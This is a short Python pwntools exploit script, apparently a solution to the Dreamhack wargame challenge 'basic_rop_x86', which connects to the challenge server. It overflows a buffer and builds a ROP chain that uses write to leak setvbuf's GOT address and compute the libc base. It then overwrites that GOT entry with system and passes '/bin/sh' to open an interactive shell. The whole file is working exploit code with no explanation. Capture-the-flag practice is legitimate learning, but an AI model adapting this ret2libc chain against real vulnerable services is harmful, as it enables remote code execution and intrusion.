from pwn import *

#p=process("./basic_rop_x86")
p=remote("host2.dreamhack.games", 9492)
e=ELF("./basic_rop_x86")
libc=ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
payload = b"A"*0x48

puts_plt = e.plt["puts"]
read_plt = e.plt["read"]
write_plt = e.plt["write"]
setvbuf_plt = e.plt["setvbuf"]
read_got = e.got["read"]
setvbuf_got = e.got["setvbuf"]
print("puts_plt: " + str(hex(puts_plt)))
print("setvbuf_got: " + str(hex(setvbuf_got)))
pop_ebx = 0x080483d9
p3r = 0x08048689

payload += p32(write_plt) + p32(p3r) + p32(1) + p32(setvbuf_got) + p32(4)
payload += p32(read_plt) + p32(p3r) + p32(0) + p32(setvbuf_got) + p32(0x100)
payload += p32(setvbuf_plt) + p32(pop_ebx) + p32(setvbuf_got+0x4)

p.send(payload)

p.recvuntil(b"A"*0x40)
setvbuf = u32(p.recvn(4))
lb = setvbuf - libc.symbols["setvbuf"]
system = lb + libc.symbols["system"]
print("setvbuf: " + str(hex(setvbuf)))
print("system: " + str(hex(system)))
print("lb: " + str(hex(lb)))
p.send(p32(system)+b"/bin/sh\x00")

p.interactive()